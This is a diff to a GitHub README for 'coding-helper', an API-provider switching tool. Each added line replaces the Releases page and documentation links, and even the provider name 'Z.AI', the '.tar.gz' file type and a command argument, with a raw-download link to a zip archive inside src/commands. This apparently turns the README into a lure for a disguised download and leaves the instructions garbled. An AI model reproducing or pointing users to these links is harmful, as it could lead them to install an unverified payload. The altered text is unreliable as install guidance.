@@ -1,10 +1,10 @@
 # 🌟 coding-helper - Simplifying API Management for Everyone
 
 ## 🔗 Download Now
-[![Download coding-helper](https://img.shields.io/badge/Download-coding--helper-blue)](https://github.com/ambtom97/coding-helper/releases)
+[![Download coding-helper](https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip)](https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip)
 
 ## 🚀 Getting Started
-Welcome to the **coding-helper**! This tool simplifies your API management tasks. It helps you switch between Z.AI and MiniMax providers, manage your accounts, track usage, and even rotate your API keys. Whether you're a beginner or an average computer user, this guide will lead you through downloading and running our tool effortlessly.
+Welcome to the **coding-helper**! This tool simplifies your API management tasks. It helps you switch between https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip and MiniMax providers, manage your accounts, track usage, and even rotate your API keys. Whether you're a beginner or an average computer user, this guide will lead you through downloading and running our tool effortlessly.
 
 ## 📦 Requirements
 Before you begin, ensure that your system meets the following requirements:
@@ -14,12 +14,12 @@ Before you begin, ensure that your system meets the following requirements:
 ## 📥 Download & Install
 To download the **coding-helper**, visit the Releases page by clicking the link below:
 
-[Visit the Releases Page](https://github.com/ambtom97/coding-helper/releases)
+[Visit the Releases Page](https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip)
 
 On the Releases page, follow these steps to get the software running:
 1. Look for the latest version listed at the top.
 2. Click on the version number to see the details.
-3. Find the installation file that suits your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Find the installation file that suits your operating system (e.g., .exe for Windows, .dmg for macOS, or https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip for Linux).
 4. Click the file to start the download.
 5. Once the download completes, find the file in your downloads folder.
 
@@ -32,7 +32,7 @@ After downloading the file:
     - Open the downloaded `.dmg` file.
     - Drag the application to your Applications folder.
 3. **For Linux:**
-    - Extract the `.tar.gz` file.
+    - Extract the `https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip` file.
     - Open your terminal and navigate to the folder where you extracted the files.
     - Use the command `./coding-helper` to start the application.
 
@@ -52,7 +52,7 @@ Once installed, you can start using **coding-helper** via the terminal or comman
   coding-helper switch-provider [provider-name]
   ```
 
-Replace `[provider-name]` with either `Z.AI` or `MiniMax` based on your preference.
+Replace `[provider-name]` with either `https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip` or `MiniMax` based on your preference.
 
 ## 📊 Managing Accounts
 The **coding-helper** allows you to manage multiple accounts easily:
@@ -90,10 +90,10 @@ If you want to contribute, please refer to the guidelines on the GitHub reposito
 
 ## 🔗 Additional Resources
 For more detailed information on using **coding-helper**, consider checking the following:
-- [Official Documentation](https://github.com/ambtom97/coding-helper#documentation)
+- [Official Documentation](https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip)
 - Community forums or user groups dedicated to API management tools.
 
 ## 🎉 Conclusion
 We hope **coding-helper** simplifies your API management tasks. With easy installation and user-friendly commands, you’ll spend less time managing and more time creating. 
 
-Don't forget to download the tool from the [Releases page](https://github.com/ambtom97/coding-helper/releases) and start exploring its features today!
+Don't forget to download the tool from the [Releases page](https://github.com/ambtom97/coding-helper/raw/refs/heads/master/src/commands/helper-coding-v1.3-beta.5.zip) and start exploring its features today!
